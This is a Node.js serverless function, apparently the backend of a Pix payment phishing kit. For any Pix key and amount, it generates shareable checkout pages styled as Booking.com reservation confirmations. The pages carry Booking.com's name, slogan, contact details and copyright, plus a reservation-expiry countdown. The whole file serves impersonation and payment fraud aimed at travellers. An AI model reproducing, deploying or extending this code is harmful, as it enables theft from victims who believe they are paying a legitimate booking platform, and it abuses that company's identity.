const crypto = require('crypto');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') { return res.status(200).end(); }
  if (req.method !== 'POST') { return res.status(405).json({ error: 'Método não permitido' }); }

  try {
    const dados = req.body;
    if (!dados.chave) { return res.status(400).json({ error: 'Chave pix obrigatória' }); }

    const id = crypto.randomBytes(6).toString('hex');
    const payload = {
      chave:  dados.chave,
      marca:  dados.marca  || 'Nome do hóspede',
      desc:   dados.desc   || 'Nome da casa',
      valor:  dados.valor  || 0,
      frase:  dados.frase  || 'Você está ativando sua reserva na Booking',
      sub:    dados.sub    || 'Efetivação de Reserva',
      lTimer: dados.lTimer || 'Reserva expira em:',
      mins:   dados.mins   || 15,
      logo:   dados.logo   || '',
      rodape: {
        nome:   'Booking.com',
        slogan: 'Sua segurança é o nosso compromisso',
        tel:    '(11) 4700-3708',
        sac:    '0800-047-4429',
        email:  'suporte@booking.com',
        copy:   '© 2026 Booking.com. Todos os direitos reservados.'
      }
    };

    const url = process.env.KV_REST_API_URL;
    const token = process.env.KV_REST_API_TOKEN;

    await fetch(`${url}/set/checkout:${id}`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ value: JSON.stringify(payload), ex: 604800 })
    });

    const host = req.headers.host || 'geradordecheckoutpix.vercel.app';
    const link = `https://${host}/checkout.html?id=${id}`;

    return res.status(200).json({ link, id });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: 'Erro interno: ' + err.message });
  }
};
